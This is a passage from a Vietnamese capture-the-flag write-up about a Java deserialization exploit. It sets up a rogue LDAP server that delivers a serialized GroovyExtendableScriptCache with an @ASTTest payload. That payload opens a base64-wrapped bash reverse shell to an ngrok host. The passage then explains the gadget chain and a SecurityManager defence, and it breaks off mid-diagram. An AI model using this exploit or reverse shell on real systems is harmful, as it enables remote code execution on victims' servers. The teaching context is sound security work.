+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.groovy.GroovyExtendableScriptCache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">bashCmd</span> <span class="operator">=</span> <span class="string">&quot;bash -i &gt; /dev/tcp/0.tcp.ap.ngrok.io/14383 0&gt;&amp;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,&quot;</span> + Base64.getEncoder()</span><br><span class="line">                                                 .encodeToString(bashCmd.getBytes(StandardCharsets.UTF_8)) + <span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    static String baseUrl = &quot;https://lookup-jvcwtkoto2v1.chals.sekai.team&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">ldapPort</span> <span class="operator">=</span> <span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    static String ldapRef = String.format(&quot;ldap://local:%d/exp&quot;, ldapPort);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    static String payloadUrl = String.format(&quot;%s//x/lookup?%s&quot;, baseUrl, ldapRef);</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ldapRef</span> <span class="operator">=</span> <span class="string">&quot;ldap://host.docker.internal:9000/exp&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">payloadUrl</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:3000/dashboard/get-transaction?hash=&quot;</span> + ldapRef;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Exp</span> <span class="variable">ldapRS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exp</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(ldapRS).start();</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        httpGet(payloadUrl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">GroovyExtendableScriptCache</span> <span class="variable">ges</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyExtendableScriptCache</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pl</span> <span class="operator">=</span> String.format(</span><br><span class="line">                <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;assert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)&#125;)\ndef x\n&quot;</span>,</span><br><span class="line">                cmd);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Sending %s\n&quot;</span>, pl);</span><br><span class="line">        ges.getScript(pl);</span><br><span class="line">        objStream.writeObject(ges);</span><br><span class="line">        objStream.close();</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">httpGet</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlStr);</span><br><span class="line">        System.out.printf(<span class="string">&quot;http: %s\n&quot;</span>,url);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">        connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">        connection.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=sekai,dc=ctf&quot;</span>);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(<span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                                                                 InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                                                                 ldapPort,</span><br><span class="line">                                                                 ServerSocketFactory.getDefault(),</span><br><span class="line">                                                                 SocketFactory.getDefault(),</span><br><span class="line">                                                                 (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">InMemoryOperationInterceptor</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">                        System.out.printf(<span class="string">&quot;Incoming base=%s, sending payload\n&quot;</span>, base);</span><br><span class="line">                        <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">                        entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                        entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, getPayload());</span><br><span class="line">                        entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                        entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">                        entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                        result.sendSearchEntry(entry);</span><br><span class="line">                        result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>Compile file và chạy:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://note.bksec.vn/pad/uploads/8c89f8d0-4e7b-4c54-b2d8-0d908adc42ae.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac -cp &quot;.;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar&quot; Exp.java</span><br><span class="line"></span><br><span class="line">java -cp &quot;.;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar&quot; Exp</span><br></pre></td></tr></table></figure></div>
+
+<p>Lấy flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://note.bksec.vn/pad/uploads/a91d8576-4d6e-4e23-9427-fbd28527080f.png"
+                     
+                ></p>
+<blockquote>
+<p>Flag:  BKSEC{Fake_Flag}</p>
+</blockquote>
+<hr>
+<h2 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h2><h3 id="Groovy-la-gi"><a href="#Groovy-la-gi" class="headerlink" title="Groovy là gì?"></a>Groovy là gì?</h3><p><strong>Groovy</strong> là một ngôn ngữ scripting động chạy trên nền <strong>JVM</strong>, tương tự như Python hoặc Ruby, nhưng cú pháp gần giống Java. Nó có thể:</p>
+<ul>
+<li>Chạy trên JVM  </li>
+<li>Biên dịch script ngay tại thời điểm chạy (runtime)  </li>
+<li>Tương tác liền mạch với các class Java  </li>
+<li>Hỗ trợ các kỹ thuật meta-programming nâng cao như <strong>AST transform</strong> (rất quan trọng trong khai thác này)  </li>
+<li>Được sử dụng trong Jenkins, Gradle, và nhiều ứng dụng doanh nghiệp để thực thi plugin&#x2F;script.</li>
+</ul>
+<hr>
+<h3 id="ASTTest-la-gi"><a href="#ASTTest-la-gi" class="headerlink" title="@ASTTest là gì?"></a><code>@ASTTest</code> là gì?</h3><p><code>@groovy.transform.ASTTest</code> là một <strong>annotation trong Groovy</strong> thực thi ở thời điểm <strong>biên dịch</strong>. Nó cho phép <strong>chèn mã tuỳ ý vào quá trình biên dịch</strong>, cụ thể là trong giai đoạn <strong>AST transformation</strong>.</p>
+<p>Nguy hiểm vì Groovy sẽ <strong>thực thi nội dung bên trong khối <code>value={...}</code> trong quá trình biên dịch</strong>!</p>
+<div class="code-container" data-rel="Groovy"><figure class="iseeu highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;</span><br><span class="line">    <span class="keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>) <span class="comment">// ← EXECUTES at compile time!</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">def</span> x</span><br></pre></td></tr></table></figure></div>
+<p>Dòng assert trên không phải là kiểm tra lúc chạy, mà sẽ thực thi ngay khi GroovyShell biên dịch đoạn script.</p>
+<hr>
+<h4 id="GroovyClassLoader-la-gi"><a href="#GroovyClassLoader-la-gi" class="headerlink" title="GroovyClassLoader là gì?"></a>GroovyClassLoader là gì?</h4><p>GroovyClassLoader là một classloader đặc biệt do Groovy cung cấp, cho phép biên dịch và load các Groovy script động.</p>
+<div class="code-container" data-rel="Groovy"><figure class="iseeu highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GroovyClassLoader loader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">Class script = loader.parseClass(<span class="keyword">new</span> File(<span class="string">&quot;myscript.groovy&quot;</span>));</span><br></pre></td></tr></table></figure></div>
+<p><strong>Danger</strong><br>Nếu truyền một script bị kiểm soát bởi attacker vào GroovyClassLoader và không có ràng buộc bảo mật (như SecurityManager hoặc sandbox), thì có thể dẫn tới RCE.</p>
+<hr>
+<h4 id="SecurityManager"><a href="#SecurityManager" class="headerlink" title="SecurityManager"></a>SecurityManager</h4><p>SecurityManager trong Java giới hạn những gì một đoạn code có thể thực hiện, ví dụ như chặn <code>Runtime.exec()</code>. Tuy nhiên:</p>
+<p>Nó đã bị deprecate từ Java 17</p>
+<p>Xoá hoàn toàn trong Java 21+</p>
+<p>Không được kích hoạt mặc định trong hầu hết ứng dụng trừ khi cấu hình rõ ràng</p>
+<p>Vì vậy, nếu không có SecurityManager hoặc cấu hình yếu, các script Groovy có thể thoải mái chạy lệnh hệ thống.</p>
+<p><strong>Demo of secure vs. vulnerable config</strong><br>🔓 Insecure demo (no sandbox):</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilScript</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">                assert java.lang.Runtime.getRuntime().exec(&quot;calc&quot;) // Windows: calc</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">            def x</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        shell.parse(evilScript); <span class="comment">// ← This will execute `Runtime.exec`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>🔐 Secure setup with custom SecurityManager (Java ≤ 16)</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;exec blocked: &quot;</span> + cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">                assert java.lang.Runtime.getRuntime().exec(&quot;calc&quot;) </span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">            def x</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">GroovyShell</span>().parse(script);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace(); <span class="comment">// Shows SecurityException</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>Ví dụ: Khi gọi <code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>, nội bộ JVM sẽ gọi tiếp  <code>SecurityManager.checkExec(&quot;calc&quot;);</code><br>Nếu ứng dụng đã cài đặt một SecurityManager tùy chỉnh, phương thức <code>checkExec()</code> sẽ được gọi trước khi lệnh thực sự được thực thi, cho phép ngăn chặn RCE.</p>
+<hr>
+<h3 id="Analysis-Gadget-Chain"><a href="#Analysis-Gadget-Chain" class="headerlink" title="Analysis Gadget Chain"></a>Analysis Gadget Chain</h3><h4 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[ Attacker-controlled code ]</span><br><span class="line">           |</span><br><span class="line">           | 1. Khởi tạo đối tượng GroovyExtendableScriptCache</span><br><span class="line">           v</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| GroovyExtendableScriptCache ges                     |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">           |</span><br><span class="line">           | 2. Gọi ges.getScript(payload) để cache script độc hại</span><br><span class="line">           v</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| Payload script nhúng ASTTest:                       |</span><br><span class="line">| @ASTTest(value=&#123;                                    |</span><br><span class="line">|   assert Runtime.getRuntime().exec(&quot;cmd&quot;)           | </span><br><span class="line">| &#125;)                                                  |</span><br><span class="line">| def x                                               |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">           |</span><br><span class="line">           | 3. Gọi objStream.writeObject(ges) để serialize</span><br><span class="line">           v</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| ObjectOutputStream ghi toàn bộ đối tượng `ges`       |</span><br><span class="line">| → Bao gồm scriptCache chứa payload                   |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">           |</span><br><span class="line">           | 4. Trả về payload dạng byte[]              </span><br><span class="line">           v</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|          return byteArrayOutputStream                |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ Giai đoạn DESERIALIZE tại victim ]</span><br><span class="line">           |</span><br><span class="line">           | 5.Khi Victim gọi readObject(payload)</span><br><span class="line">           | method readObject() của class GroovyExtendableScriptCache được gọi</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| GroovyExtendableScriptCache.readObject(ObjectInputStream)  |</span><br><span class="line">| → in.defaultReadObject()                                   |</span><br><span class="line">| → ensureInitializedOrReloaded()                            |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">           |</span><br><span class="line">           | 6. ensureInitializedOrReloaded()              </span><br><span class="line">           |    - Recompile lại các script trong cache     </span><br><span class="line">           v</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| GroovyShell.parse(malicious script)                 |</span><br><span class="line">| → Biên dịch lại script đã nhúng @ASTTest            |</span><br><span class="line">| → THỰC THI :                                        |</span><br><span class="line">|   assert Runtime.getRuntime().exec(&quot;cmd&quot;)           |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">     SYSTEM COMMAND EXECUTED </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ensureInitializedOrReloaded"><a href="#ensureInitializedOrReloaded" class="headerlink" title="ensureInitializedOrReloaded()"></a>ensureInitializedOrReloaded()</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">ensureInitializedOrReloaded</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (groovyClassLoader == <span class="literal">null</span>) &#123; <span class="comment">//Khi deserialize, các transient field như groovyClassLoader sẽ là null, nên sẽ khởi tạo lại ở đây.</span></span><br><span class="line">           </span><br><span class="line">            <span class="comment">// Lấy cấu hình compile Groovy. Có thể include các transformer như AST, sandbox policy</span></span><br><span class="line">            compilerConfiguration = <span class="keyword">new</span> <span class="title class_">CompilerConfiguration</span> (getCompilerConfigurationFactory().getCompilerConfiguration());</span><br><span class="line">            <span class="keyword">if</span> (getScriptBaseClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">                compilerConfiguration.setScriptBaseClass(getScriptBaseClass());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Khởi tạo GroovyClassLoader mới, bypass sandbox nếu context thiếu security manager (đây là key để bypass trong môi trường Java cũ hoặc không sandboxed).</span></span><br><span class="line">            groovyClassLoader = AccessController.doPrivileged((PrivilegedAction&lt;GroovyClassLoader&gt;)</span><br><span class="line">                    () -&gt; <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>(getParentClassLoaderFactory().getClassLoader(), compilerConfiguration));</span><br><span class="line">            <span class="keyword">if</span> (!scriptCache.isEmpty()) &#123;</span><br><span class="line">                <span class="comment">// de-serialized: need to re-generate all previously compiled scripts (this can cause a hick-up...):</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">final</span> ScriptCacheElement element : scriptCache.keySet()) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//element.getScriptSource() trả về string script (ví dụ: @groovy.transform.ASTTest(...))</span></span><br><span class="line">                    <span class="comment">//compileScript(...) → GroovyShell.parse(...) → biên dịch lại</span></span><br><span class="line">                    <span class="comment">//Groovy sẽ parse các annotation ASTTest, và assert ... sẽ được thực thi tại compile-time</span></span><br><span class="line">                    element.setScriptClass(compileScript(element.getBaseClass(), element.getScriptSource(), element.getScriptName()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Sơ đồ khai thác :</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| ScriptCacheElement (has)    |</span><br><span class="line">| - scriptSource              |</span><br><span class="line">| - malicious AST payload     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span class="line">+-------------------------------+</span><br><span class="line">| ensureInitializedOrReloaded() |</span><br><span class="line">| - detect non-null cache       |</span><br><span class="line">| - loop each script element    |</span><br><span class="line">+-------------------------------+</span><br><span class="line">           |</span><br><span class="line">           v</span><br><span 